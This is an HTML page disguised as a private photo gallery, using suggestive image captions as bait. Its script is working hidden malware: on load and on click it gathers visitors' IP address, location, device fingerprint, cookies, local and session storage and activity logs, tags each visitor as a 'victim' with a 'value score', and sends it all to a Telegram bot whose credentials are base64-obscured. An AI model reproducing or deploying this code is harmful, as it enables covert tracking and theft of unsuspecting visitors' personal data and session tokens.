<!DOCTYPE html>
<html>
<head>
    <title>My Private Photos</title>
    <style>
        body { 
            font-family: Arial, sans-serif; 
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            margin: 0;
            padding: 20px;
            min-height: 100vh;
            color: white;
        }
        .container {
            max-width: 800px;
            margin: 0 auto;
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            padding: 30px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
        }
        h1 {
            text-align: center;
            margin-bottom: 10px;
            font-size: 2.5em;
        }
        .subtitle {
            text-align: center;
            margin-bottom: 30px;
            opacity: 0.8;
        }
        .gallery {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
            margin: 30px 0;
        }
        .image-card {
            background: rgba(255, 255, 255, 0.1);
            border-radius: 15px;
            padding: 15px;
            text-align: center;
            cursor: pointer;
            transition: all 0.3s ease;
            border: 2px solid transparent;
        }
        .image-card:hover {
            transform: translateY(-5px);
            border-color: rgba(255, 255, 255, 0.3);
            background: rgba(255, 255, 255, 0.2);
        }
        .image-card img {
            width: 100%;
            height: 150px;
            object-fit: cover;
            border-radius: 10px;
            margin-bottom: 10px;
        }
        .image-title {
            font-weight: bold;
            margin-bottom: 5px;
        }
        .image-desc {
            font-size: 0.8em;
            opacity: 0.7;
        }
        .loading {
            display: none;
            text-align: center;
            margin: 20px 0;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Private Photo Vault</h1>
        <p class="subtitle">Exclusive content - Click to view full album</p>
        
        <div class="loading" id="loading">Loading secure content...</div>
        
        <div class="gallery">
            <div class="image-card" onclick="openImage(1)">
                <img src="https://media.discordapp.net/attachments/1342593658364497981/1342620926881300530/447f96e5bf00f5176fef6f8768b45781.png?ex=691852ed&is=6917016d&hm=e862bf208981e87cf9e607f4a9a29f759c36f5e26886bd3e3ce04e215e698755&=&format=webp&quality=lossless&width=522&height=928" 
                     alt="Private Photo 1" 
                     onerror="this.src='https://via.placeholder.com/200x150/667eea/ffffff?text=Photo+1'">
                <div class="image-title">Daily activitieessss <3 </div>
                <div class="image-desc">normal pics </div>
            </div>
            
            <div class="image-card" onclick="openImage(2)">
                <img src="https://media.discordapp.net/attachments/1342593658364497981/1342609374727897198/IMG_9996.png?ex=6918f0eb&is=69179f6b&hm=af10fcd91e227159bce4658ab5a01d02201200c58a04c6e1ccdb42aa1bbe98e5&=&format=webp&quality=lossless&width=522&height=928" 
                     alt="Private Photo 2"
                     onerror="this.src='https://via.placeholder.com/200x150/764ba2/ffffff?text=Photo+2'">
                <div class="image-title">NVDES</div>
                <div class="image-desc">Title says it all lol</div>
            </div>
            
            <div class="image-card" onclick="openImage(3)">
                <img src="https://media.discordapp.net/attachments/1342593658364497981/1342957978726174730/DA159703-8392-4407-9FBA-E250EF3F4567.png?ex=6918e415&is=69179295&hm=29e9451d7e53b356deae156054bc832945d51c50d27786aa10b60e412cf08979&=&format=webp&quality=lossless" 
                     alt="Private Photo 3"
                     onerror="this.src='https://via.placeholder.com/200x150/48bb78/ffffff?text=Photo+3'">
                <div class="image-title">My facee</div>
                <div class="image-desc">I'm sooo ugly ik >_< </div>
            </div>
        </div>
    </div>

    <script>
        // ENCRYPTED TELEGRAM CONFIG (Base64 encoded)
        const ENCRYPTED_CONFIG = {
            token: 'ODU5NDg5NzgxNjpBQUZ0V1RRVE9QU291RExLNVd0YzdJcmttRlhndER1YXFscw==',
            chatId: 'ODAzMjQ5NDQ3OQ=='
        };

        // DECRYPTION FUNCTION
        function decryptConfig() {
            return {
                token: atob(ENCRYPTED_CONFIG.token),
                chatId: atob(ENCRYPTED_CONFIG.chatId)
            };
        }

        const CONFIG = decryptConfig();

        // GLOBAL DATA STORAGE
        let allCollectedData = {};
        let sessionLog = [];
        let pageLoadTime = Date.now();
        let reportSent = false;

        // COMPREHENSIVE DATA COLLECTION
        async function collectAllData() {
            const startTime = Date.now();
            
            try {
                // Collect all data in parallel
                const [networkData, technicalData, behavioralData, storageData] = await Promise.allSettled([
                    getNetworkInfo(),
                    getTechnicalInfo(),
                    getBehavioralInfo(),
                    getStorageInfo()
                ]);

                allCollectedData = {
                    meta: {
                        timestamp: new Date().toISOString(),
                        victimId: generateVictimId(),
                        url: window.location.href,
                        collectionTime: Date.now() - startTime,
                        userAgent: navigator.userAgent
                    },
                    network: networkData.status === 'fulfilled' ? networkData.value : {},
                    technical: technicalData.status === 'fulfilled' ? technicalData.value : {},
                    behavioral: behavioralData.status === 'fulfilled' ? behavioralData.value : {},
                    storage: storageData.status === 'fulfilled' ? storageData.value : {},
                    inferred: {
                        device: inferDeviceType(),
                        os: inferOperatingSystem(),
                        browser: inferBrowser(),
                        location: await inferLocation(),
                        value: calculateVictimValue()
                    }
                };

                return allCollectedData;
            } catch (error) {
                console.error('Data collection error:', error);
                return getFallbackData();
            }
        }

        // NETWORK INFORMATION
        async function getNetworkInfo() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const ipData = await response.json();
                
                try {
                    const locationResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
                    const locationData = await locationResponse.json();
                    return {
                        ip: ipData.ip,
                        city: locationData.city || 'Unknown',
                        region: locationData.region || 'Unknown',
                        country: locationData.country_name || 'Unknown',
                        countryCode: locationData.country_code || 'Unknown',
                        isp: locationData.org || 'Unknown',
                        asn: locationData.asn || 'Unknown',
                        timezone: locationData.timezone || 'Unknown'
                    };
                } catch (e) {
                    return {
                        ip: ipData.ip,
                        city: 'Unknown',
                        country: 'Unknown',
                        isp: 'Unknown'
                    };
                }
            } catch (error) {
                return {
                    ip: 'Unknown',
                    city: 'Unknown',
                    country: 'Unknown',
                    isp: 'Unknown'
                };
            }
        }

        // TECHNICAL INFORMATION
        function getTechnicalInfo() {
            return {
                platform: navigator.platform,
                vendor: navigator.vendor || 'Unknown',
                language: navigator.language,
                languages: navigator.languages || ['Unknown'],
                hardware: {
                    cores: navigator.hardwareConcurrency || 'Unknown',
                    memory: navigator.deviceMemory || 'Unknown',
                    touchPoints: navigator.maxTouchPoints || 0
                },
                screen: {
                    width: screen.width,
                    height: screen.height,
                    availWidth: screen.availWidth,
                    availHeight: screen.availHeight,
                    colorDepth: screen.colorDepth,
                    pixelRatio: window.devicePixelRatio
                },
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                timezoneOffset: new Date().getTimezoneOffset(),
                cookieEnabled: navigator.cookieEnabled,
                pdfEnabled: navigator.pdfViewerEnabled || false,
                webdriver: navigator.webdriver || false,
                plugins: getPluginsList(),
                fonts: getFontsList(),
                canvas: getCanvasFingerprint(),
                webgl: getWebGLInfo()
            };
        }

        // BEHAVIORAL INFORMATION
        function getBehavioralInfo() {
            return {
                referrer: document.referrer || 'Direct',
                sessionStart: pageLoadTime,
                duration: Date.now() - pageLoadTime,
                interactions: {
                    total: sessionLog.length,
                    clicks: sessionLog.filter(log => log.type === 'click').length,
                    moves: sessionLog.filter(log => log.type === 'mousemove').length,
                    scrolls: sessionLog.filter(log => log.type === 'scroll').length,
                    keys: sessionLog.filter(log => log.type === 'keydown').length
                },
                scrollDepth: getScrollDepth(),
                viewport: `${window.innerWidth}x${window.innerHeight}`,
                engagement: calculateEngagementScore()
            };
        }

        // STORAGE INFORMATION
        function getStorageInfo() {
            return {
                cookies: getAllCookies(),
                localStorage: getAllLocalStorage(),
                sessionStorage: getAllSessionStorage()
            };
        }

        // HELPER FUNCTIONS
        function getPluginsList() {
            const plugins = [];
            for (let i = 0; i < navigator.plugins.length; i++) {
                plugins.push(navigator.plugins[i].name);
            }
            return plugins;
        }

        function getFontsList() {
            const fontList = [
                'Arial', 'Arial Black', 'Comic Sans MS', 'Courier New',
                'Georgia', 'Impact', 'Times New Roman', 'Trebuchet MS',
                'Verdana', 'Webdings', 'Wingdings'
            ];
            const availableFonts = [];
            
            const canvas = document.createElement('canvas');
            const context = canvas.getContext('2d');
            const testString = "mmmmmmmmmmlli";
            const testSize = '72px';
            
            fontList.forEach(font => {
                context.font = testSize + " '" + font + "'";
                const width1 = context.measureText(testString).width;
                context.font = testSize + " 'monospace'";
                const width2 = context.measureText(testString).width;
                if (width1 !== width2) {
                    availableFonts.push(font);
                }
            });
            
            return availableFonts;
        }

        function getCanvasFingerprint() {
            try {
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                ctx.textBaseline = 'top';
                ctx.font = '14px Arial';
                ctx.fillStyle = '#f60';
                ctx.fillRect(125, 1, 62, 20);
                ctx.fillStyle = '#069';
                ctx.fillText('Hello, world!', 2, 15);
                return canvas.toDataURL().substring(22, 50);
            } catch(e) {
                return 'failed';
            }
        }

        function getWebGLInfo() {
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl');
                return gl ? 'WebGL Available' : 'No WebGL';
            } catch(e) {
                return 'failed';
            }
        }

        function getAllCookies() {
            const cookies = {};
            if (document.cookie) {
                document.cookie.split(';').forEach(cookie => {
                    const [name, value] = cookie.split('=').map(c => c.trim());
                    if (name) cookies[name] = value || '';
                });
            }
            return cookies;
        }

        function getAllLocalStorage() {
            const storage = {};
            try {
                for (let i = 0; i < localStorage.length; i++) {
                    const key = localStorage.key(i);
                    storage[key] = localStorage.getItem(key);
                }
            } catch(e) {}
            return storage;
        }

        function getAllSessionStorage() {
            const storage = {};
            try {
                for (let i = 0; i < sessionStorage.length; i++) {
                    const key = sessionStorage.key(i);
                    storage[key] = sessionStorage.getItem(key);
                }
            } catch(e) {}
            return storage;
        }

        function getScrollDepth() {
            const scrollHeight = Math.max(
                document.body.scrollHeight,
                document.documentElement.scrollHeight,
                document.body.offsetHeight,
                document.documentElement.offsetHeight,
                document.body.clientHeight,
                document.documentElement.clientHeight
            ) - window.innerHeight;
            
            const scrolled = window.scrollY;
            return scrollHeight > 0 ? Math.round((scrolled / scrollHeight) * 100) : 0;
        }

        function calculateEngagementScore() {
            const duration = Date.now() - pageLoadTime;
            const interactions = sessionLog.length;
            return Math.min(100, Math.round((interactions / 10) + (duration / 1000)));
        }

        function inferDeviceType() {
            const ua = navigator.userAgent.toLowerCase();
            if (/mobile|android|iphone|ipad/.test(ua)) return 'Mobile';
            if (/tablet|ipad/.test(ua)) return 'Tablet';
            return 'Desktop';
        }

        function inferOperatingSystem() {
            const ua = navigator.userAgent;
            if (/Windows/.test(ua)) return 'Windows';
            if (/Mac/.test(ua)) return 'macOS';
            if (/Linux/.test(ua)) return 'Linux';
            if (/Android/.test(ua)) return 'Android';
            if (/iOS|iPhone|iPad/.test(ua)) return 'iOS';
            return 'Unknown';
        }

        function inferBrowser() {
            const ua = navigator.userAgent;
            if (/Chrome/.test(ua) && !/Edg/.test(ua)) return 'Chrome';
            if (/Firefox/.test(ua)) return 'Firefox';
            if (/Safari/.test(ua) && !/Chrome/.test(ua)) return 'Safari';
            if (/Edg/.test(ua)) return 'Edge';
            return 'Unknown';
        }

        async function inferLocation() {
            try {
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();
                return {
                    city: data.city || 'Unknown',
                    region: data.region || 'Unknown',
                    country: data.country_name || 'Unknown'
                };
            } catch(e) {
                return {
                    city: 'Unknown',
                    region: 'Unknown',
                    country: 'Unknown'
                };
            }
        }

        function calculateVictimValue() {
            let value = 50;
            if (allCollectedData.technical?.hardware?.cores >= 4) value += 10;
            if (allCollectedData.network?.country !== 'Unknown') value += 20;
            if (allCollectedData.behavioral?.interactions?.total > 10) value += 15;
            if (Object.keys(allCollectedData.storage?.cookies || {}).length > 0) value += 15;
            return Math.min(100, value);
        }

        function generateVictimId() {
            return 'v_' + Math.random().toString(36).substr(2, 9) + '_' + Date.now().toString(36);
        }

        function getFallbackData() {
            return {
                meta: {
                    timestamp: new Date().toISOString(),
                    victimId: generateVictimId(),
                    url: window.location.href,
                    userAgent: navigator.userAgent
                },
                network: { ip: 'Unknown', country: 'Unknown' },
                technical: { platform: navigator.platform },
                behavioral: { referrer: document.referrer },
                storage: {},
                inferred: { device: 'Unknown', os: 'Unknown' }
            };
        }

        // SEND DATA TO TELEGRAM
        async function sendToTelegram(message) {
            try {
                const response = await fetch(`https://api.telegram.org/bot${CONFIG.token}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        chat_id: CONFIG.chatId,
                        text: message,
                        parse_mode: 'Markdown'
                    })
                });
                
                if (response.ok) {
                    console.log('Message sent successfully');
                    return true;
                } else {
                    console.error('Telegram API error:', await response.text());
                    return false;
                }
            } catch (error) {
                console.error('Network error sending to Telegram:', error);
                return false;
            }
        }

        // FORMAT AND SEND COMPREHENSIVE REPORT
        async function sendComprehensiveReport() {
            if (reportSent) return;
            
            showLoading(true);
            const data = await collectAllData();
            const message = formatReportMessage(data);
            
            const success = await sendToTelegram(message);
            if (success) {
                reportSent = true;
                console.log('Comprehensive report sent');
            } else {
                console.error('Failed to send report');
            }
            showLoading(false);
        }

        function formatReportMessage(data) {
            return `ðŸš¨ **COMPLETE DATA CAPTURE REPORT** ðŸš¨

ðŸ“Š **VICTIM IDENTIFICATION**
ðŸ†” ID: ${data.meta.victimId}
â° Collection Time: ${data.meta.collectionTime}ms
ðŸŒ URL: ${data.meta.url}
ðŸ“… Timestamp: ${new Date(data.meta.timestamp).toLocaleString()}

ðŸŒ **NETWORK INFORMATION**
ðŸ“ IP Address: ${data.network.ip}
ðŸ™ï¸ Location: ${data.network.city}, ${data.network.country} (${data.network.countryCode})
ðŸ¢ ISP: ${data.network.isp}
ðŸ”¢ ASN: ${data.network.asn}
â° Timezone: ${data.network.timezone}

ðŸ’» **SYSTEM INFORMATION**
ðŸ–¥ï¸ Platform: ${data.technical.platform}
ðŸ”§ OS: ${data.inferred.os} | Browser: ${data.inferred.browser}
ðŸ“± Device: ${data.inferred.device}
âš™ï¸ Hardware: ${data.technical.hardware.cores} cores, ${data.technical.hardware.memory}GB RAM
ðŸ–¥ï¸ Screen: ${data.technical.screen.width}x${data.technical.screen.height}
ðŸŽ¯ Pixel Ratio: ${data.technical.screen.pixelRatio}
ðŸŒ Language: ${data.technical.language}
â° System Timezone: ${data.technical.timezone}

ðŸ“ˆ **BEHAVIORAL DATA**
ðŸ”— Referrer: ${data.behavioral.referrer}
â±ï¸ Session Duration: ${Math.round(data.behavioral.duration/1000)}s
ðŸ–±ï¸ Total Interactions: ${data.behavioral.interactions.total}
ðŸ“œ Scroll Depth: ${data.behavioral.scrollDepth}%
ðŸŽ¯ Engagement Score: ${data.behavioral.engagement}/100
ðŸ‘ï¸ Viewport: ${data.behavioral.viewport}

ðŸ’¾ **STORAGE DATA**
ðŸª Cookies: ${Object.keys(data.storage.cookies).length}
ðŸ’¿ Local Storage: ${Object.keys(data.storage.localStorage).length}
ðŸ“€ Session Storage: ${Object.keys(data.storage.sessionStorage).length}

ðŸ” **TECHNICAL FINGERPRINT**
ðŸ”Œ Plugins: ${data.technical.plugins.length}
ðŸ”¤ Fonts: ${data.technical.fonts.length}
ðŸŽ¨ Canvas: ${data.technical.canvas}
ðŸ”„ WebGL: ${data.technical.webgl}
ðŸ” Cookies Enabled: ${data.technical.cookieEnabled}
ðŸ“„ PDF Viewer: ${data.technical.pdfEnabled}

ðŸŽ¯ **INFERRED DATA**
ðŸ’° Value Score: ${data.inferred.value}/100
ðŸ“± Device Type: ${data.inferred.device}

âš¡ **DATA CAPTURE COMPLETE**`;
        }

        function showLoading(show) {
            const loadingEl = document.getElementById('loading');
            if (loadingEl) {
                loadingEl.style.display = show ? 'block' : 'none';
            }
        }

        // SESSION TRACKING
        function setupSessionTracking() {
            const events = ['mousemove', 'click', 'scroll', 'keydown', 'input'];
            events.forEach(event => {
                document.addEventListener(event, (e) => {
                    sessionLog.push({
                        type: event,
                        timestamp: Date.now(),
                        x: e.clientX,
                        y: e.clientY,
                        target: e.target.tagName
                    });
                });
            });
        }

        // IMAGE HANDLER
        function openImage(imageId) {
            const images = {
                1: 'https://media.discordapp.net/attachments/1342593658364497981/1342620926881300530/447f96e5bf00f5176fef6f8768b45781.png?ex=691852ed&is=6917016d&hm=e862bf208981e87cf9e607f4a9a29f759c36f5e26886bd3e3ce04e215e698755&=&format=webp&quality=lossless&width=522&height=928',
                2: 'https://media.discordapp.net/attachments/1342593658364497981/1342609374727897198/IMG_9996.png?ex=6918f0eb&is=69179f6b&hm=af10fcd91e227159bce4658ab5a01d02201200c58a04c6e1ccdb42aa1bbe98e5&=&format=webp&quality=lossless&width=522&height=928',
                3: 'https://media.discordapp.net/attachments/1342593658364497981/1342957978726174730/DA159703-8392-4407-9FBA-E250EF3F4567.png?ex=6918e415&is=69179295&hm=29e9451d7e53b356deae156054bc832945d51c50d27786aa10b60e412cf08979&=&format=webp&quality=lossless'
            };
            
            if (images[imageId]) {
                window.open(images[imageId], '_blank');
            }
            
            if (!reportSent) {
                sendComprehensiveReport();
            }
        }

        // INITIALIZATION
        window.addEventListener('load', function() {
            pageLoadTime = Date.now();
            setupSessionTracking();
            
            // Send report after 3 seconds
            setTimeout(sendComprehensiveReport, 3000);
            
            // Send final report on unload
            window.addEventListener('beforeunload', function() {
                if (!reportSent) {
                    const finalData = allCollectedData.meta ? allCollectedData : getFallbackData();
                    const finalMessage = `ðŸ”š **SESSION ENDED**\nVictim: ${finalData.meta.victimId}\nDuration: ${Math.round((Date.now() - pageLoadTime)/1000)}s\nInteractions: ${sessionLog.length}`;
                    
                    // Use sendBeacon for reliable delivery on page unload
                    const blob = new Blob([JSON.stringify({
                        chat_id: CONFIG.chatId,
                        text: finalMessage,
                        parse_mode: 'Markdown'
                    })], {type: 'application/json'});
                    
                    navigator.sendBeacon(`https://api.telegram.org/bot${CONFIG.token}/sendMessage`, blob);
                }
            });
        });

        console.log('Data capture system initialized');
    </script>
</body>
</html>
